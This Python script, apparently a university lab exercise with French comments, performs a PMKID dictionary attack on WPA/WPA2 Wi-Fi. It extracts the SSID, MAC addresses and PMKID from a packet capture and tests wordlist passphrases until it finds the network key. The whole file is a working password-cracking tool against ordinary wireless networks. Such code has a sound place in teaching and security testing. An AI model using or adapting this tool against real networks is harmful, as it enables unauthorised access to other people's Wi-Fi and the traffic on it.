#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Abraham Rubinstein et Yann Lederrey"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
import binascii
from pbkdf2 import *
import hmac, hashlib
from scapy.contrib.wpa_eapol import WPA_key

def findBeacon(capture):
    """
    Cette fonction détecte et retourne le premier Beacon de la capture
    """
    for frame in capture:
        # si la trame est de type et sous-type Beacon, on la retourne
        if frame.type == 0 and frame.subtype == 8:
            return frame

def find4wayHandShake(capture):
    """
    Cette fonction détecte et retourne le premier 4 way handshake
    """
    for frame in capture:
        # source AP --> client
        if frame.type == 0x2 and frame.subtype == 0x8 and bytes_hex(raw(frame)[93:95]) == b'008a':
            return frame

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")

# Recuperation de la premiere trame du handshake pour extraire pmkid
handshake_first = find4wayHandShake(wpa)
# recherche du premier beacon dans la capture
Beacon = findBeacon(wpa)
# Récupération du SSID
ssid = Beacon.info.decode("utf-8")
# Récupération de l'adresse MAC de l'AP
APmac = a2b_hex(Beacon.addr2.replace(':', ''))
# Récupération de l'adresse MAC du client
Clientmac = a2b_hex(handshake_first.addr1.replace(':', ''))
# Récupération du PMKID
PMKID = raw(handshake_first)[193:-4].hex()

print("\n\nValues used to compute PMKID")
print("============================")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("PMKID from capture: ", PMKID, "\n\n")

with open('wordlist.txt','r') as file:

    # reading each line
    for line in file:
        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1,str.encode(line.rstrip('\n')), str.encode(ssid), 4096, 32)

        # calculate the pmkid from the word in wordlist
        pmkid_from_wordlist = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)

        if(hmac.compare_digest(PMKID, pmkid_from_wordlist.hexdigest()[0:32])):
            print("Success ! The key is : ", line.rstrip('\n'))
            break
